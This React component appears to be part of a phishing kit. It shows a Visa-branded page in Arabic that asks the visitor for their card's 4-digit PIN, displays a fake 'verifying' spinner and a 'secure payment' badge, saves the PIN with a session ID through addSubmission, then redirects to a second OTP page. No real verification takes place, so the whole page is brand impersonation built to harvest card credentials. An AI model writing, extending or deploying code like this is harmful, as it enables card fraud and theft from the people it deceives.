import { useState } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import imgm from "../assets/imgm_1779063055370.png";
import visaIncLogo from "../assets/Visa_Inc._logo.svg_1779063055374.png";

export default function Atm() {
  const [, setLocation] = useLocation();
  const [atmCode, setAtmCode] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (atmCode.length !== 4) return;
    
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }

    setLoading(true);
    try {
      addSubmission("atm", sessionId, { atmCode });
      setTimeout(() => setLocation("/otp2"), 5000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f7fa] flex flex-col">
      <div className="bg-white p-4 shadow-sm border-b flex justify-center">
        <img src={visaIncLogo} alt="Visa" className="h-8" />
      </div>

      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center"
          >
            <Loader2 className="w-16 h-16 animate-spin text-[#1a1f71] mb-6" />
            <h2 className="text-xl font-bold text-gray-800">جاري التحقق من الرمز السري...</h2>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="mb-8">
          <img src={imgm} alt="ATM Mobile" className="h-40 mx-auto" />
        </div>

        <div className="bg-white rounded-xl shadow-md border border-gray-200 p-8 max-w-sm w-full text-center">
          <h2 className="text-2xl font-bold text-[#1a1f71] mb-2">أدخل الرمز السري</h2>
          <p className="text-gray-500 mb-8 text-sm">الرجاء إدخال الرمز السري الخاص بالبطاقة (4 أرقام)</p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <Input 
              type="password" 
              required 
              value={atmCode} 
              onChange={e => setAtmCode(e.target.value.replace(/\D/g, "").substring(0, 4))} 
              placeholder="••••"
              dir="ltr"
              className="text-center text-4xl tracking-[1em] h-16 font-mono bg-gray-50"
              maxLength={4}
            />

            <Button 
              type="submit" 
              className="w-full h-14 text-lg font-bold bg-[#1a1f71] hover:bg-[#1a1f71]/90 text-white rounded-lg shadow-md"
              disabled={loading || atmCode.length !== 4}
            >
              تحقق
            </Button>
          </form>
          
          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-400">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            نظام حماية الدفع الآمن
          </div>
        </div>
      </div>
    </div>
  );
}
